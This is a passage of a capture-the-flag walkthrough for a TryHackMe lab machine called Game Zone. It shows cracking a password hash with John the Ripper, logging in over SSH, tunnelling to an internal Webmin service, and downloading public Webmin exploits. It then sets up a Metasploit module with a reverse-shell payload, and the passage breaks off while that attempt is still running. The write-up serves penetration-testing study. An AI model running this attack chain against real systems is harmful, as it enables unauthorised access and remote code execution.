+Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+Least Possible Hashs:
+[+] GOST R 34.11-94
+[+] RipeMD-256
+[+] SNEFRU-256
+[+] SHA-256(HMAC)
+[+] Haval-256(HMAC)
+[+] RipeMD-256(HMAC)
+[+] SNEFRU-256(HMAC)
+[+] SHA-256(md5($pass))
+[+] SHA-256(sha1($pass))
+--------------------------------------------------
+</pre> </div> </div> <p><br> Run john the ripper to crack the hash.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4626"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4626')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4626')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4626')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4626')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4626">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 hash.txt      
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+videogamer124    (agent47)     
+1g 0:00:00:00 DONE (2025-02-26 17:34) 4.000g/s 11796Kp/s 11796Kc/s 11796KC/s vimivi..vainlove
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4626" onclick="terminalOverlayClose('bash-bash-4626')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4626')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4626')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4626')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4626" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 hash.txt      
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+videogamer124    (agent47)     
+1g 0:00:00:00 DONE (2025-02-26 17:34) 4.000g/s 11796Kp/s 11796Kc/s 11796KC/s vimivi..vainlove
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed.
+</pre> </div> </div> <p><br> SSH into the machine using our newly found, fancy credentials.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4829"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4829')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4829')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4829')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4829')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4829">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ ssh agent47@10.10.190.117                
+The authenticity of host '10.10.190.117 (10.10.190.117)' can't be established.
+ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.190.117' (ED25519) to the list of known hosts.
+agent47@10.10.190.117's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+agent47@gamezone:~$
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4829" onclick="terminalOverlayClose('bash-bash-4829')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4829')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4829')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4829')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4829" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ ssh agent47@10.10.190.117                
+The authenticity of host '10.10.190.117 (10.10.190.117)' can't be established.
+ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.190.117' (ED25519) to the list of known hosts.
+agent47@10.10.190.117's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+agent47@gamezone:~$
+</pre> </div> </div> <p><br> Get the user.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4969"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4969')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4969')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4969')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4969')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4969">
+agent47@gamezone:~$ cat user.txt
+&lt;redacted&gt;
+agent47@gamezone:~$ ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:1e:8d:69:ac:fd  
+          inet addr:10.10.190.117  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::1e:8dff:fe69:acfd/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:987 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1075 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:152885 (152.8 KB)  TX bytes:300738 (300.7 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:2016 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2016 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:174164 (174.1 KB)  TX bytes:174164 (174.1 KB)
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4969" onclick="terminalOverlayClose('bash-bash-4969')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4969')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4969')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4969')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4969" data-language="bash">
+agent47@gamezone:~$ cat user.txt
+&lt;redacted&gt;
+agent47@gamezone:~$ ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:1e:8d:69:ac:fd  
+          inet addr:10.10.190.117  Bcast:10.10.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::1e:8dff:fe69:acfd/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+          RX packets:987 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1075 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:152885 (152.8 KB)  TX bytes:300738 (300.7 KB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:2016 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2016 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:174164 (174.1 KB)  TX bytes:174164 (174.1 KB)
+</pre> </div> </div> <p><br> Run ss -tulpn to get a list of the ports that are listening.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42145"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42145')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42145')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42145')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42145')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42145">
+agent47@gamezone:~$ ss -tulpn
+Netid  State      Recv-Q Send-Q                                                                      Local Address:Port                                                                                     Peer Address:Port              
+udp    UNCONN     0      0                                                                                       *:50119                                                                                               *:*                  
+udp    UNCONN     0      0                                                                                       *:68                                                                                                  *:*                  
+udp    UNCONN     0      0                                                                                       *:10000                                                                                               *:*                  
+tcp    LISTEN     0      80                                                                              127.0.0.1:3306                                                                                                *:*                  
+tcp    LISTEN     0      128                                                                                     *:10000                                                                                               *:*                  
+tcp    LISTEN     0      128                                                                                     *:22                                                                                                  *:*                  
+tcp    LISTEN     0      128                                                                                    :::80                                                                                                 :::*                  
+tcp    LISTEN     0      128                                                                                    :::22                                                                                                 :::*
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42145" onclick="terminalOverlayClose('bash-bash-42145')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42145')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42145')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42145')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42145" data-language="bash">
+agent47@gamezone:~$ ss -tulpn
+Netid  State      Recv-Q Send-Q                                                                      Local Address:Port                                                                                     Peer Address:Port              
+udp    UNCONN     0      0                                                                                       *:50119                                                                                               *:*                  
+udp    UNCONN     0      0                                                                                       *:68                                                                                                  *:*                  
+udp    UNCONN     0      0                                                                                       *:10000                                                                                               *:*                  
+tcp    LISTEN     0      80                                                                              127.0.0.1:3306                                                                                                *:*                  
+tcp    LISTEN     0      128                                                                                     *:10000                                                                                               *:*                  
+tcp    LISTEN     0      128                                                                                     *:22                                                                                                  *:*                  
+tcp    LISTEN     0      128                                                                                    :::80                                                                                                 :::*                  
+tcp    LISTEN     0      128                                                                                    :::22                                                                                                 :::*
+</pre> </div> </div> <p><br> Create a local ssh tunnel that forwards port 10000 trough the SSH tunnel so we can view the website.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4482"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4482')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4482')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4482')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4482')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4482">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ ssh -L 10000:localhost:10000 agent47@10.10.190.117
+agent47@10.10.190.117's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Wed Feb 26 00:35:45 2025 from 10.4.119.29
+agent47@gamezone:~$
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4482" onclick="terminalOverlayClose('bash-bash-4482')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4482')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4482')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4482')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4482" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ ssh -L 10000:localhost:10000 agent47@10.10.190.117
+agent47@10.10.190.117's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Wed Feb 26 00:35:45 2025 from 10.4.119.29
+agent47@gamezone:~$
+</pre> </div> </div> <p><br> Check the website in the web browser using localhost and the 10000 port. The internal website traffic will get forwarded through the local SSH tunnel.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/10000.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="10000" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Use the agent47 credential to login to webmin so we can get the version. We will need it to look-up and exploit.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/webmin.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Webmin" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Look-up in Exploit-DB for our version of Webmin and find an authenticated exploit.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gamezone/exploitdb.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Exploit-DB" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://www.exploit-db.com/exploits/50809" rel="external nofollow noopener" target="_blank">https://www.exploit-db.com/exploits/50809</a></p> <p><br> Download the exploit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41168"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41168')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41168')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41168')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41168')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41168">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ wget https://www.exploit-db.com/raw/50809 -O exploit.py                               
+--2025-02-26 18:12:04--  https://www.exploit-db.com/raw/50809
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7042 (6.9K) [text/plain]
+Saving to: ‘exploit.py’
+
+exploit.py                                                 100%[========================================================================================================================================&gt;]   6.88K  --.-KB/s    in 0.004s  
+
+2025-02-26 18:12:06 (1.54 MB/s) - ‘exploit.py’ saved [7042/7042]
+
+
+
+
+
+
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ curl https://raw.githubusercontent.com/JohnHammond/CVE-2012-2982/refs/heads/master/CVE-2012-2982.py -o CVE-2012-2982.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3897  100  3897    0     0   6873      0 --:--:-- --:--:-- --:--:--  6873
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41168" onclick="terminalOverlayClose('bash-bash-41168')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41168')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41168')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41168')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41168" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ wget https://www.exploit-db.com/raw/50809 -O exploit.py                               
+--2025-02-26 18:12:04--  https://www.exploit-db.com/raw/50809
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7042 (6.9K) [text/plain]
+Saving to: ‘exploit.py’
+
+exploit.py                                                 100%[========================================================================================================================================&gt;]   6.88K  --.-KB/s    in 0.004s  
+
+2025-02-26 18:12:06 (1.54 MB/s) - ‘exploit.py’ saved [7042/7042]
+
+
+
+
+
+
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ curl https://raw.githubusercontent.com/JohnHammond/CVE-2012-2982/refs/heads/master/CVE-2012-2982.py -o CVE-2012-2982.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3897  100  3897    0     0   6873      0 --:--:-- --:--:-- --:--:--  6873
+</pre> </div> </div> <p><br> Since the box called for metasploit. I gave it a whirl. I couldn’t get it. I gave up since we have the exploit.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-44951"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-44951')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-44951')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-44951')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-44951')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-44951">
+┌──(kali㉿kali)-[~/Documents/thm/gamezone]
+└─$ msfconsole -q
+msf6 &gt; search webmin 1.580
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/webmin/edit_html_fileaccess
+
+msf6 &gt; use 
+Usage: use &lt;name|term|index&gt;
+
+Interact with a module by name or search term/index.
+If a module name is not found, it will be treated as a search term.
+An index from the previous search results can be selected if desired.
+
+Examples:
+  use exploit/windows/smb/ms17_010_eternalblue
+
+  use eternalblue
+  use &lt;name|index&gt;
+
+  search eternalblue
+  use &lt;name|index&gt;
+
+msf6 &gt; use exploit/unix/webapp/webmin_show_cgi_exec
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; show options
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT     10000            yes       The target port (TCP)
+   SSL       true             yes       Use SSL
+   USERNAME                   yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set rhosts localhost
+rhosts =&gt; localhost
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set USERNAME agent47
+USERNAME =&gt; agent47
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set PASSWORD videogamer124
+PASSWORD =&gt; videogamer124
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit
+[*] Exploiting target 127.0.0.1
+[-] Exploit failed: A payload has not been selected.
+[*] Exploiting target ::1
+[-] Exploit failed: A payload has not been selected.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload linux/x86/shell_reverse_tcp
+[-] The value specified for payload is not valid.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload linux/x86/shell/reverse_tcp
+[-] The value specified for payload is not valid.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload cmd/linux/http/x86/read_file
+[-] The value specified for payload is not valid.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload cmd/unix/reverse_perl
+payload =&gt; cmd/unix/reverse_perl
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit
+[*] Exploiting target 127.0.0.1
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+[*] Exploiting target ::1
+[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set lhost tun0
+lhost =&gt; tun0
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set lhost tun0
+lhost =&gt; tun0
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) &gt; exploit
+[*] Exploiting target 127.0.0.1
+[*] Started reverse TCP handler on 10.4.119.29:4444 
+[*] Attempting to login...
+[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=127.0.0.1:10000 state=error: record layer failure
+[*] Exploiting target ::1
+[*] Started reverse TCP handler on 10.4.119.29:4444 
+[*] Attempting to login...
